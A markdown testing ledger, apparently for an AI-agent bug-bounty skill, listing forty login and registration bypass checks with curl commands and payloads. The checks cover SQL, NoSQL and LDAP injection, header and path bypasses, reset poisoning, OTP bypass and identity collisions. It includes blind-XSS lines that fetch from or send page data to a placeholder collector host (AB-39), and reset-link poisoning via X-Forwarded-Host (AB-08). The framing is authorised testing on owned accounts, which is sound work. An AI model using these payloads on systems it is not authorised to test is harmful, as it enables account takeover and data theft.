# Login & Registration Bypass: 40-Check Ledger

**Progress:** `[ 0 / 40 assessed ]`

Layout per check: **severity if vulnerable**, tags, objective, commands, pass/fail, references. AB-01…AB-30 are the core list (same numbering as the subagent files); AB-31…AB-40 are extended vectors (verification chains, identity collisions, OTP bypass, stored input in identity fields, public forms).

Variables: `$T` target origin · `$S` = `.agents/skills/authbypass/scripts` · `$E` = `artifacts/authbypass/evidence` · `$COLLAB` your OOB host.
Accounts: **A** = attacker, **B** = victim, **C** = spare — all yours, each with its own real inbox/phone you control. Use plus-addressing (`you+a@`, `you+b@`) only where the target treats it as distinct; otherwise use separate inboxes.

Status: `PASS` · `FINDING` · `INFO` · `NOT_APPLICABLE` · `BLOCKED`. Record every row in `artifacts/authbypass/authbypass_checklist_40.tsv`.

Reference shorthands:
- `PS-AUTH` = `https://portswigger.net/web-security/authentication` (password-based, multi-factor, other-mechanisms)
- `PS-LOGIC` = `https://portswigger.net/web-security/logic-flaws/examples`
- `PS-AC` = `https://portswigger.net/web-security/access-control`
- `WSTG-ATHN` = `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/`
- `WSTG-IDNT` = `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/`
- `WSTG-INPV` = `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/`
- `CS-AUTH` = `https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html`

---

## Subagent 01 — Injection & Semantic Bypasses

### AB-02 · SQL injection in login username/password — `CRITICAL`
Tags: `auth` `sqli` `login-bypass`

Classic bypass payloads in each field separately, then in both; JSON and form encodings; boolean/time differentials to detect blind injection without logging in as anyone else.

```bash
while IFS= read -r p; do
  curl -sk -o /dev/null -w "%{http_code} %{size_download} %{time_total}  $p\n" -X POST "$T/login" \
    --data-urlencode "username=$p" --data-urlencode 'password=wrong'; sleep 1
done < <(sed -n '/^## 1\./,/^---/p' .agents/skills/authbypass/references/auth_bypass_payloads.md | grep -vE '^(#|`|-|$)')
# Confirm with your own account A:   username=A'-- -   /   username=A' AND '1'='1' -- -
```

- **Fail:** login succeeds without A's password, or responses differ by boolean/time (then hand to the SQLi skill; do not dump data).
- **Refs:** https://portswigger.net/web-security/sql-injection (lab: SQL injection vulnerability allowing login bypass) · `WSTG-INPV`05-Testing_for_SQL_Injection

### AB-03 · NoSQL injection in authentication — `CRITICAL`
Tags: `auth` `nosqli` `mongodb`

Operator injection (`$ne`, `$gt`, `$regex`, `$in`, `$where`) via JSON bodies and bracket notation (`username[$ne]=x`). Target your own username with an operator password first.

```bash
curl -sk -X POST "$T/login" -H 'Content-Type: application/json' -d '{"username":"A","password":{"$ne":"x"}}' -w '\n%{http_code}\n'
curl -sk -X POST "$T/login" --data 'username=A&password[$ne]=x' -w '\n%{http_code}\n'
curl -sk -X POST "$T/login" -H 'Content-Type: application/json' -d '{"username":{"$regex":"^A"},"password":{"$ne":"x"}}' -w '\n%{http_code}\n'
```

- **Fail:** authenticated as A without A's password (proof), or `$regex` yields per-character oracle.
- **Refs:** https://portswigger.net/web-security/nosql-injection · `WSTG-INPV`05.6-Testing_for_NoSQL_Injection

### AB-04 · LDAP injection in enterprise authentication — `HIGH`
Tags: `auth` `ldap` `injection`

Filter metacharacters `* ( ) & | \ NUL` in username; compare responses. Shared with `oauth-sso` OA-25 for IdP login forms.

```bash
for u in '*' 'A*' 'A)(uid=*' '*)(|(uid=*' 'A)(|(objectClass=*' 'A\00'; do
  curl -sk -X POST "$T/login" --data-urlencode "username=$u" --data-urlencode 'password=wrong' -o /dev/null -w "$u -> %{http_code} %{size_download}\n"; sleep 1
done
```

- **Fail:** auth bypass or filter-dependent response differences.
- **Refs:** `WSTG-INPV`06-Testing_for_LDAP_Injection · https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html

### AB-25 · Oversized username/password (overflow, truncation, ReDoS, hash DoS) — `MEDIUM`
Tags: `auth` `input-length` `dos`

**Single** requests at increasing sizes (256, 1 KB, 10 KB, 100 KB). Watch for 500s, stack traces, latency growth (bcrypt truncation at 72 bytes, PBKDF2 long-password DoS, regex backtracking). Never loop or parallelise.

```bash
for n in 256 1024 10240 102400; do
  P=$(python3 -c "print('A'*$n)")
  curl -sk -o /dev/null -w "$n -> %{http_code} %{time_total}s\n" -X POST "$T/register" \
    -H 'Content-Type: application/json' -d "{\"username\":\"lenprobe$n\",\"email\":\"you+len$n@your-domain.test\",\"password\":\"$P\"}"
  sleep 3
done
# bcrypt truncation: set password = 72*'A' + 'X', then log in with 72*'A' + 'Y'
```

- **Fail:** crash/stack trace; super-linear latency; password truncation that lets a different password log in.
- **Refs:** `CS-AUTH` (Implement Proper Password Strength Controls: max length) · https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

### AB-28 · Null byte / control characters in username — `HIGH`
Tags: `auth` `null-byte` `truncation`

Register or log in with `B%00`, `B%00anything`, `B%0a`, `B%09`, `B%20`, `B\u0000`; the storage layer may truncate at the NUL while validation saw a unique value.

```bash
python3 -I $S/identity_variants.py --username B --mode username | grep -E 'null|control|space'
```

- **Fail:** registration of a variant creates an account that logs in as / collides with B, or bypasses uniqueness.
- **Refs:** `WSTG-IDNT`05-Testing_for_Weak_or_Unenforced_Username_Policy · https://owasp.org/www-community/attacks/Embedding_Null_Code

### AB-29 · Unicode case-mapping / normalisation confusion — `CRITICAL`
Tags: `auth` `unicode` `canonicalisation`

Characters that normalise or case-fold to ASCII: Turkish dotless `ı` (U+0131 → `I` on upper), Kelvin `K` (U+212A → `k`), long s `ſ` (U+017F → `S`), fullwidth `ａｄｍｉｎ` (NFKC → `admin`), ligatures `ﬀ`, superscripts `ᵃ`. Register A with a confusable of B's username/email, then trigger password reset / login for the confusable.

```bash
python3 -I $S/identity_variants.py --email B@example.test --username B --mode unicode
```

- **Fail:** reset token for B delivered to A's mailbox; A's login opens B's account; uniqueness bypassed (GitHub 2019 dotless-i reset bug; Spotify 2013 canonical-username ATO).
- **Refs:** https://www.unicode.org/reports/tr36/ · https://www.unicode.org/reports/tr15/ · `WSTG-IDNT`05

---

## Subagent 02 — Middleware, Headers & Paths

Use `scripts/bypass_matrix.sh` for 06/07/16/17 in one bounded pass:
`$S/bypass_matrix.sh --target example.com --url "$T/admin" --out artifacts/authbypass/bypass_matrix.tsv`

### AB-06 · Authentication bypass via HTTP method switching — `HIGH`
Tags: `auth` `http-method` `verb-tampering`

Protected route/action that rejects unauthenticated `GET`/`POST` may accept `HEAD`, `PUT`, `PATCH`, `OPTIONS`, arbitrary verbs (`FOO`), or method-override (`X-HTTP-Method-Override: GET`, `_method=`).

- **Fail:** protected content or state change without authentication (or with a lower-privileged session).
- **Refs:** `PS-AC` (Method-based access control can be circumvented) · `WSTG-ATHN`04-Testing_for_Bypassing_Authentication_Schema

### AB-07 · Forceful browsing to authenticated pages — `HIGH`
Tags: `auth` `forced-browsing` · Owner: Subagent 05 (listed here because `bypass_matrix.sh` covers it)

Request every post-login route/API (from A's HAR and `contentdiscovery` output) with no cookies and with an **unverified / half-registered / MFA-pending** session.

```bash
while read -r u; do curl -sk -o /dev/null -w "%{http_code} %{size_download} $u\n" "$u"; sleep 0.5; done < artifacts/authbypass/authenticated_urls.txt
```

- **Fail:** authenticated data/actions reachable without a complete session (compare body sizes, not just status — many apps return 200 + login page).
- **Refs:** `WSTG-ATHN`04 · `PS-AC`

### AB-15 · X-Forwarded-For (and friends) bypass of IP-based rate limiting — `MEDIUM`
Tags: `auth` `rate-limit` `ip-spoofing`

On your **own** account A: trigger the lockout/rate limit with wrong passwords, then rotate `X-Forwarded-For`, `X-Real-IP`, `X-Client-IP`, `X-Originating-IP`, `True-Client-IP`, `CF-Connecting-IP`, `Forwarded: for=`. Also try resetting the counter by interleaving a successful login.

```bash
for i in $(seq 1 12); do
  curl -sk -o /dev/null -w "$i %{http_code}\n" -H "X-Forwarded-For: 10.0.$((i/250)).$((i%250))" -X POST "$T/login" -d "username=A&password=wrong$i"
done
```

- **Fail:** lockout/limit never triggers when the header changes (and the correct password still works after N failures).
- **Refs:** `PS-AUTH` (lab: Broken brute-force protection, IP block) · `WSTG-ATHN`03-Testing_for_Weak_Lock_Out_Mechanism

### AB-16 · X-Original-URL / X-Rewrite-URL middleware bypass — `HIGH`
Tags: `auth` `x-original-url` `reverse-proxy`

Front-end blocks `/admin` but the back end (IIS/Symfony/Zend) routes on `X-Original-URL`/`X-Rewrite-URL`.

```bash
curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' -H 'X-Original-URL: /admin' "$T/"
curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' -H 'X-Rewrite-URL: /admin' "$T/"
curl -sk -o /dev/null -w '%{http_code}\n' -H 'X-Original-URL: /does-not-exist-bbtest' "$T/"   # 404 here = header honoured
```

- **Fail:** protected content via the header.
- **Refs:** `PS-AC` (URL-based access control can be circumvented)

### AB-17 · URL path manipulation (versions, normalisation) — `HIGH`
Tags: `auth` `path-normalisation` `api-versioning`

`/api/v2/admin` protected but `/api/v1/admin`, `/api/internal/`, `/v3/` not; normalisation differentials `/admin/.`, `//admin`, `/./admin`, `/admin..;/`, `/%2e/admin`, `/admin%2f`, `/ADMIN`, `/admin;jsessionid=x`, `/admin.json`, trailing `?` / `#`.

- **Fail:** any variant returns protected content.
- **Refs:** https://portswigger.net/web-security/access-control#url-matching-discrepancies · https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf

### AB-18 · HTTP parameter pollution in authentication — `HIGH`
Tags: `auth` `hpp` `parameter-pollution`

Duplicate parameters / JSON keys / arrays in login, reset, OTP and email-change requests. Back ends differ (Express → array, ASP.NET → `a,b`, PHP → last, Flask → first).

```bash
curl -sk -X POST "$T/forgot-password" -d 'email=B@example.test&email=A@example.test' -w '\n%{http_code}\n'
curl -sk -X POST "$T/forgot-password" -H 'Content-Type: application/json' -d '{"email":["B@example.test","A@example.test"]}'
curl -sk -X POST "$T/forgot-password" -H 'Content-Type: application/json' -d '{"email":"B@example.test","email":"A@example.test"}'
```

- **Fail:** B's reset link/OTP arrives in A's inbox (ATO), or validation and action use different copies.
- **Refs:** https://portswigger.net/web-security/api-testing/server-side-parameter-pollution · `WSTG-INPV`04-Testing_for_HTTP_Parameter_Pollution · `references/session_puzzling_and_otp_playbook.md` §3

### AB-19 · API key / token in URL query string — `MEDIUM`
Tags: `auth` `api-key` `url-exposure`

Find `?api_key=`, `?token=`, `?access_token=`, `?auth=` in endpoints/JS/HAR; test whether keys accepted in headers are also accepted in the URL (logs, Referer, history).

```bash
grep -Eio '[?&](api_?key|apikey|token|access_token|auth|key|secret)=[^&" ]+' artifacts/discovered_endpoints.txt artifacts/js/* 2>/dev/null | sort -u | head
```

- **Fail:** long-lived credentials in URLs, especially with third-party resources on the page.
- **Refs:** https://portswigger.net/kb/issues/00500700_session-token-in-url · `CS-AUTH`

---

## Subagent 03 — Registration, Mass Assignment & Identity Collisions

### AB-05 · Auth bypass via parameter tampering (`role=admin`) — `HIGH`
Tags: `auth` `parameter-tampering`

Add/modify `role`, `admin`, `isAdmin`, `is_staff`, `access_level`, `user_type`, `authenticated=true`, `mfa_verified=true`, `step=3` in login responses/requests and client-side cookies (`admin=false` → `true`, `Admin=1`).

- **Fail:** elevated or completed-auth state accepted from client input.
- **Refs:** `PS-AC` (User role controlled by request parameter; User role can be modified in user profile) · `PS-LOGIC`

### AB-09 · Duplicate email/username handling & registration races — `HIGH`
Tags: `registration` `duplicate` `race-condition`

1. Register an existing user's email (B) — does it overwrite B's password, reset B's verification, or create a twin?
2. Race: send 10–20 identical registrations for a fresh address you own in a single packet (Burp Repeater *Send group in parallel* / Turbo Intruder `single-packet attack`).
3. Twinning: two accounts identical in every field except email (AB-34).

- **Fail:** two accounts share a unique identifier; B's credentials changed; login/reset resolves to the wrong twin.
- **Refs:** https://portswigger.net/web-security/race-conditions · `WSTG-IDNT`02-Test_User_Registration_Process

### AB-13 · Mass assignment in registration — `CRITICAL`
Tags: `registration` `mass-assignment`

Mirror every field the API *returns* for a user (`GET /api/me`) back into the registration and profile-update bodies: `role`, `roles[]`, `isAdmin`, `verified`, `email_verified`, `tenant_id`, `org_id`, `plan`, `credits`, `permissions`.

```bash
curl -sk -X POST "$T/api/register" -H 'Content-Type: application/json' -d '{
  "username":"bbtest_ma","email":"you+ma@your-domain.test","password":"S3cure!pass",
  "role":"admin","isAdmin":true,"email_verified":true,"verified":true,"org_id":1}' -o $E/AB-13.json
curl -sk -b "$SESS_MA" "$T/api/me"
```

- **Fail:** any privileged/verification field persisted.
- **Refs:** https://portswigger.net/web-security/api-testing (Mass assignment) · https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html

### AB-14 · Privilege escalation during registration — `CRITICAL`
Tags: `registration` `privesc` `invite-flow`

Hidden/older registration endpoints (`/admin/register`, `/api/v1/users`, invite acceptance `/invite/accept?role=`), invite tokens re-usable for other roles/orgs, joining an org by claiming its email domain (→ AB-37), self-service tenant creation then cross-tenant role.

- **Fail:** new account obtains a role/tenant it was not invited to.
- **Refs:** `WSTG-IDNT`03-Test_Account_Provisioning_Process · `PS-LOGIC` (Inconsistent security controls)

### AB-23 · Disposable email acceptance — `INFO`
Tags: `registration` `disposable-email`

Register test accounts with a few disposable domains. Usually `INFO` unless the program's business rules (free trials, referral credits, one-account-per-person) make it impactful — then chain with `business-logic-vulns`.

- **Refs:** `WSTG-IDNT`02

### AB-30 · Admin-impersonating email/username formats — `MEDIUM`
Tags: `registration` `impersonation` `domain-trust`

Register addresses that look internal: `admin@target.com.your-domain.test`, `support-target@your-domain.test`, `you@target.com@your-domain.test`, `you%40target.com@your-domain.test`, display names `Target Support`. Check whether the app grants trust by substring/suffix (`endsWith("target.com")`), shows staff badges, or sends emails that render as from staff.

- **Fail:** internal-only features/roles granted, or authorization by email domain bypassed (PortSwigger lab: *Inconsistent security controls* — `@dontwannacry.com`).
- **Refs:** `PS-LOGIC` · `WSTG-IDNT`02

### AB-33 · Email parameter manipulation → ATO / duplicate registration — `CRITICAL`
Tags: `registration` `email-parsing` `ato`

Feed the payload families from `references/email_manipulation_payloads.md` (generated by `identity_variants.py`) into registration, email change, password reset and invite endpoints. Families: case (`B@EXAMPLE.TEST`), plus/dot addressing, whitespace/NUL/tab, `victim@x@attacker`, CRLF `cc:`/`bcc:` header injection, delimiter lists (`,` `;` `|` space), duplicate params / JSON arrays, quoted local parts, trailing dot domain.

```bash
python3 -I $S/identity_variants.py --email B@example.test --attacker A@your-domain.test --mode email > $E/AB-33_payloads.tsv
```

- **Fail:** reset/verification for B delivered to A; duplicate account for B's address; mail header injection sends copies to A.
- **Refs:** https://portswigger.net/research/splitting-the-email-atom · `PS-LOGIC` · `references/email_manipulation_payloads.md`

### AB-34 · Duplicate-identity "twinning" & case collisions — `HIGH`
Tags: `registration` `twinning` `case-sensitivity`

Create C identical to B in username/display name/phone but a different email; create `B` vs `b` vs `B ` (trailing space) vs `B=` vs `B.`; check which account login, password reset, @mentions, invites, payments, and admin search resolve to.

```bash
python3 -I $S/identity_variants.py --username B --mode username
```

- **Fail:** actions intended for B reach C (or vice versa); C can log in as B.
- **Refs:** `WSTG-IDNT`05 · Jerry Shah, *Duplicate Registration – The Twinning Twins* (Medium)

### AB-35 · SQL truncation attack — `CRITICAL`
Tags: `registration` `sql-truncation`

If the DB column is shorter than the validation limit and comparison ignores trailing spaces (MySQL non-strict mode), registering `admin` + spaces up to column length + `x` stores as `admin`.

```bash
python3 -I $S/identity_variants.py --username B --mode truncation --max-len 64
# Also email: PortSwigger "Inconsistent handling of exceptional input" (255-char truncation of the email domain)
```

- **Fail:** second account with B's identifier, or login as B with A's password.
- **Refs:** `PS-LOGIC` (Inconsistent handling of exceptional input) · https://owasp.org/www-community/attacks/SQL_Injection (truncation variant)

---

## Subagent 04 — Verification, Reset & Account Takeover

### AB-08 · Broken password reset — `CRITICAL`
Tags: `auth` `password-reset` `ato`

Token bound to user? (A's token + `user=B`); token reuse/expiry; token in response/Referer; Host-header poisoning of the reset link (`Host`, `X-Forwarded-Host` → `$COLLAB`, with B's email — you own B's inbox, confirm the link points to `$COLLAB`); predictable tokens; reset without old sessions revoked (→ `session-management` SM-08).

```bash
curl -sk -X POST "$T/forgot-password" -H "X-Forwarded-Host: $COLLAB" -d 'email=B@example.test'   # inspect link in B's inbox
curl -sk -X POST "$T/reset-password" -d "token=$TOKEN_A&username=B&password=NewPass!23" -w '\n%{http_code}\n'
```

- **Fail:** any path resetting B's password without B's token.
- **Refs:** `PS-AUTH`/other-mechanisms (password reset poisoning, broken logic) · https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html · `WSTG-ATHN`09-Testing_for_Weak_Password_Change_or_Reset_Functionalities

### AB-10 · Email verification bypass (direct activation) — `HIGH`
Tags: `registration` `email-verification`

Skip the step (call post-verification APIs directly), tamper the verify request (`verified=true`, other user's id), response manipulation (`{"verified":false}` → `true` — only counts if the **server** then treats the account as verified), reuse A's token for C.

- **Fail:** server-side verified state without clicking a valid link for that address.
- **Refs:** `WSTG-IDNT`02 · `references/session_puzzling_and_otp_playbook.md` §2

### AB-11 · ATO via email change without current-email verification — `CRITICAL`
Tags: `account` `email-change` `ato`

Email change should need re-authentication (password/MFA) **and** notify/confirm the old address. Also test: change via CSRF; change via IDOR (`user_id`); race two change requests (PortSwigger single-endpoint race lab); the new email is used for login/reset *before* confirmation.

```bash
curl -sk -b "$SESS_A" -X POST "$T/account/email" -d 'email=you+new@your-domain.test' -w '\n%{http_code}\n'
```

- **Fail:** email switches with no password and no old-address confirmation, or reset works for the unconfirmed new address.
- **Refs:** https://portswigger.net/web-security/race-conditions (Single-endpoint race conditions lab) · `CS-AUTH` (Require re-authentication for sensitive features)

### AB-12 · ATO via phone number change without verification — `CRITICAL`
Tags: `account` `phone-change` `sms`

Same as AB-11 for phone: OTP to new number only, OTP to old number missing, OTP not bound to the number (verify number X with code sent to Y), phone usable for login/reset before verification.

- **Refs:** https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html · `WSTG-ATHN`10-Testing_for_Weaker_Authentication_in_Alternative_Channel

### AB-22 · Account usable without email verification — `MEDIUM`
Tags: `registration` `unverified-account`

Unverified account can: log in, invite others, send messages/emails from the platform, make purchases, join orgs by domain, link OAuth (→ `oauth-sso` OA-31 pre-account takeover).

- **Fail:** sensitive capabilities before verification; especially "register B's email unverified → B later signs up via SSO → merged into attacker account".
- **Refs:** `WSTG-IDNT`02 · `oauth-sso` OA-31

### AB-26 · Verification/reset email bombing — `LOW`
Tags: `registration` `email-bomb` `rate-limit`

Max 15 triggers to **your own** inbox; count deliveries. Also test the other email-sending endpoints (invite, share, contact) → AB-40.

- **Fail:** all delivered with no throttling. Many programs rate this Low/Informative; check policy.
- **Refs:** `WSTG`10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits

### AB-31 · Email verification bypass via email-change chains — `HIGH`
Tags: `registration` `email-verification` `logic`

Three chains (all with addresses you own; "target address" = `you+target@`, which you never verify):
1. Sign up `A1` (don't confirm) → change email to target → **confirm the old A1 link** → target address now verified.
2. Sign up `A1` (don't confirm) → change to `A2` → confirm A2 → change back to `A1` → is `A1` marked verified without a new link?
3. Email change: does the **old** verification/change link still work after a newer change (link doesn't expire)?

- **Fail:** any address becomes verified without a link sent to that address. Impact: claim `support@target.com`-style addresses or another user's email (→ AB-37, OA-31).
- **Refs:** `PS-LOGIC` · https://portswigger.net/web-security/race-conditions

### AB-32 · Verification link / OTP / reset token leaked in response — `CRITICAL`
Tags: `registration` `token-leak`

Inspect registration, resend, reset and email-change responses (body, headers, JSON debug fields, `Set-Cookie`) and JS state for the token or OTP.

```bash
curl -sk -X POST "$T/forgot-password" -d 'email=you+b@your-domain.test' -D - | tee $E/AB-32.txt | grep -Ei 'token|otp|code|verify|reset'
```

- **Fail:** token/OTP for an address is returned to the requester.
- **Refs:** `WSTG-ATHN`09 · `references/session_puzzling_and_otp_playbook.md`

### AB-36 · OTP / verification-code bypass — `CRITICAL`
Tags: `otp` `2fa` `verification`

| Technique | Test |
|---|---|
| Response manipulation | Flip `{"success":false}` / 401 → server must still deny subsequent steps |
| Brute force | Codes ≤ 6 digits: is there a per-code-attempt limit and per-account limit? Test with your own account; stop after proving > 20 attempts accepted |
| Array / JSON tricks | `{"otp":["000000","000001",…]}`, `{"otp":{"$ne":""}}`, `otp=` empty, `otp=null`, `otp=true` |
| Defaults | `000000`, `111111`, `123456`, `4242`, `0000` |
| Leaked | OTP in response (AB-32) |
| Old OTP still valid | Request two codes, use the first |
| Integrity | Use **A's** valid OTP to complete **C's** verification (code not bound to account/phone) |
| Repeated submission | Same valid code replayed via Repeater after success |
| Skip step | Call the post-OTP endpoint directly (forced browsing, AB-07) |

- **Fail:** any technique completes the OTP step without the right code for that account.
- **Refs:** `PS-AUTH`/multi-factor (2FA simple bypass; 2FA broken logic; 2FA bypass using a brute-force attack) · https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html · `references/session_puzzling_and_otp_playbook.md`

### AB-37 · Organisation / partner email-domain confirmation bypass — `CRITICAL`
Tags: `registration` `org-join` `domain-trust`

Apps that auto-join users to an org/store/partner workspace based on email domain, or let a store "add staff by email": can an unconfirmed `@target-partner.com` address (via AB-31/AB-33/AB-35) join or take over that org?

- **Fail:** membership/ownership granted on an unconfirmed or spoofed corporate email.
- **Refs:** `PS-LOGIC` (Inconsistent security controls) · `WSTG-IDNT`03

---

## Subagent 05 — Enumeration, Timing & Defensive Controls

### AB-01 · Username/email enumeration (timing and non-timing) — `LOW`–`MEDIUM`
Tags: `auth` `enumeration` `timing`

Non-timing first: status codes, messages, body length, redirect, `Set-Cookie`, lockout messages, registration ("already taken"), reset ("email sent" vs "not found"). Then timing with `timing_enum.py`: your own account A vs random non-existent names, with a wrong password (valid users often trigger a slow hash).

```bash
python3 -I $S/timing_enum.py --target example.com --url "$T/login" \
  --data 'username={user}&password=WrongPass!{n}' --users A,doesnotexist_x1,doesnotexist_x2 --samples 12 --delay 1
```

- **Fail:** consistent, statistically clear difference (report effect size and sample count). Many programs accept enumeration only on login/reset when it enables a further attack.
- **Refs:** `PS-AUTH`/password-based (Username enumeration via response timing / subtly different responses) · `WSTG-IDNT`04-Testing_for_Account_Enumeration_and_Guessable_User_Account

### AB-20 · Timing attack on comparison function — `LOW`
Tags: `auth` `timing` `constant-time`

Non-constant-time comparison of tokens/API keys/HMACs (`==`). Over the internet this is rarely exploitable; collect evidence with `timing_enum.py` against your own token with first-byte-correct vs first-byte-wrong variants (hundreds of samples, low rate) and report only with strong statistics. Otherwise `INFO` / code review.

- **Refs:** https://codahale.com/a-lesson-in-timing-attacks/ · `CS-AUTH`

### AB-21 · CAPTCHA bypass — `MEDIUM`
Tags: `auth` `captcha`

Omit the CAPTCHA parameter; send empty/`null`; replay one solved token many times; reuse a token across endpoints/accounts; check server-side verification (`siteverify` called?); alternate endpoints without CAPTCHA (mobile API, `/api/v1/login`); CAPTCHA only after N failures — reset counter via AB-15 headers.

- **Fail:** brute-force/registration automation possible despite CAPTCHA.
- **Refs:** `WSTG-ATHN`04 · `CS-AUTH`

### AB-24 · Weak password-reset security questions — `MEDIUM`
Tags: `auth` `kba` `security-questions`

Questions with OSINT-able / small answer spaces (mother's maiden name, city of birth, favourite colour), unlimited attempts, case-insensitive single-word answers, questions shown before identity proof (enumeration).

- **Refs:** `WSTG-ATHN`08-Testing_for_Weak_Security_Question_Answer · https://cheatsheetseries.owasp.org/cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html

### AB-27 · Lockout bypass via email/username case variants — `MEDIUM`
Tags: `auth` `lockout` `case-sensitivity`

Lock A (`A@x.test`), then continue with `a@X.TEST`, `A@x.test ` (space), `A@x.test.` , plus/dot variants that the login normalises but the lockout counter does not.

- **Fail:** attempts continue against the same account under a variant key.
- **Refs:** `WSTG-ATHN`03 · `PS-AUTH`/password-based (Broken brute-force protection, multiple credentials per request)

---

## Subagent 06 — Stored Input in Identity Fields & Public Forms

### AB-38 · Path overwrite via username / slug — `HIGH`
Tags: `registration` `path-overwrite` `routing`

If profiles live at `/{username}` or `/u/{slug}`, register reserved names (`login`, `admin`, `api`, `static`, `.well-known`, `robots.txt`, `favicon.ico`, `logout`, `settings`, `sw.js`) and path-like names (`../admin`, `%2e%2e`, `a/b`). Check whether your profile shadows a real route, serves at `/.well-known/…` (domain verification, `security.txt`), or overwrites cached static files.

```bash
python3 -I $S/identity_variants.py --username B --mode reserved
```

- **Fail:** user-controlled content served at a system path (domain-verification hijack, phishing on login path, service-worker scope).
- **Refs:** `WSTG-IDNT`05 · https://portswigger.net/web-security/file-path-traversal

### AB-39 · Stored / blind XSS & HTML injection via registration fields — `HIGH`
Tags: `registration` `xss` `html-injection` `blind-xss`

Username, first/last name, company, email local-part (`"<svg/onload=…>"@your-domain.test` is a valid quoted local part), address fields — rendered in the app, in **admin/support panels** (blind), and in **emails** (HTML injection in welcome/invite emails: injected links/forms). Use your **own** blind-XSS collector (Burp Collaborator, self-hosted XSS Hunter); never reuse someone else's xss.report/js.rip IDs.

```text
"><img src=x onerror=fetch('//COLLAB/r?'+document.domain)>
"><script src=//COLLAB/x.js></script>
"/><img src="x"><a href="https://COLLAB">login</a>              (HTML injection in emails)
<a href='https://COLLAB'>Click</a><form action='https://COLLAB'>  (email template injection)
```

- **Fail:** script execution in any viewer context, or attacker-controlled links/forms rendered in platform-sent emails.
- **Refs:** https://portswigger.net/web-security/cross-site-scripting/stored · https://owasp.org/www-community/attacks/xss/ · https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

### AB-40 · Public forms: missing rate limits & blind XSS (contact-us, support chat, feedback) — `MEDIUM`
Tags: `public-forms` `rate-limit` `blind-xss`

Unauthenticated contact/support/feedback forms and chat uploads: (1) send ≤ 15 benign submissions, clearly labelled `bbtest`, and check for throttling/CAPTCHA (email-sending forms can be abused to spam third parties — prove only against your own address); (2) blind XSS payloads (your collector) in name/subject/message and in uploaded file **names** / SVG images in support chat.

- **Fail:** unlimited submissions that send mail to user-supplied addresses (spam relay); blind XSS fires in the support console.
- **Refs:** `WSTG`10-Business_Logic_Testing/05 · https://portswigger.net/web-security/cross-site-scripting/stored

---

## Ledger template (`artifacts/authbypass/authbypass_checklist_40.tsv`)

```
check_id	subagent	status	severity	finding_id	evidence_path	notes
AB-01	05
AB-02	01
...
AB-40	06
```
